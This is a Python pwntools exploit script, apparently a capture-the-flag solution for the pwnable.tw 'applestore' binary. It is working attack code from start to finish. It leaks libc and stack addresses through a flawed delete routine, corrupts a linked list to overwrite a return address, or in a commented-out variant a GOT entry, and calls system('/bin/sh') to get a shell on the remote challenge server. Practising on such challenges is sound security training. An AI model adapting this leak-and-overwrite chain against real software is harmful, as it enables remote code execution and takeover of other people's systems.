from pwn import *

local = False

if local:
	r = process("./applestore")
	#gdb.attach(r)
	r.recvuntil(">")
	puts_off = 0x5fca0
	sys_off = 0x3ada0
	binsh_off = 0x15ba0b
	environ_off = 0x1b3dbc
else:
	r = remote("chall.pwnable.tw", 10104)	
	r.recvuntil(">")
	puts_off = 0x5f140
	sys_off = 0x3a940
	binsh_off = 0x158e8b
	environ_off = 0x1b1dbc

def add(index):
	r.sendline(str(2))
	r.recvuntil(">")
	r.send(str(index))
	r.recvuntil(">")
def checkout():
	r.sendline(str(5))
	r.recvuntil(">")
	r.sendline("y")
	r.recvuntil(">")

def cart(p):
	r.send(p)
	r.recvuntil(">")
	r.sendline("y")
	return r.recvuntil(">")

def delete(payload):
	r.sendline(str(3))
	r.recvuntil(">")
	r.send(payload)
	s = r.recvuntil(">")
	s = "0x" + enhex(s[11:15][::-1])
	s = int(s, 16)
	return s

# 6 20 0 0
def setup():
	for i in range(6):
		add(1)
	for i in range(20):
		add(2)



setup()
checkout()
got_puts = 0x0804b028
got_atoi = 0x0804b040
# bug in delete funtion is more useful than checkout function
# leak any value base on delete element 27th
# iphone8 is 27th element and overwritten by read_delete
# leaking libc base
payload = "27" + p32(got_puts) + p32(0)*3
leak = delete(payload)
base = leak - puts_off
print hex(base)
sys_addr = base + sys_off
binsh_addr = base + binsh_off
environ_addr = base + environ_off
# leaking stack addr by environ (global variable)
payload = "27" + p32(environ_addr) + p32(0)*3
leak = delete(payload)
ebp_delete = leak - 0x104

# get shell
# first way: overwrite got
# second way: overwrite ret of a function in stack


# solution 1
'''
# from double linked list, change ebp to got, use read to write to got instead of stack 
payload = "27" + p32(leak) + p32(0) + p32(ebp_delete-0xc) + p32(got_atoi + 0x22)
delete(payload)
payload = p32(sys_addr) + ";" + "/bin/sh\x00"
r.sendline(payload)
r.interactive()
'''

# solution2
# overwrite return of my_read in handler function
payload = "27" + p32(leak) + p32(0) + p32(ebp_delete-0xc) + p32(leak - 0xde)
delete(payload)
payload = p32(sys_addr) + p32(leak) + p32(binsh_addr)
r.sendline(payload)
r.interactive()

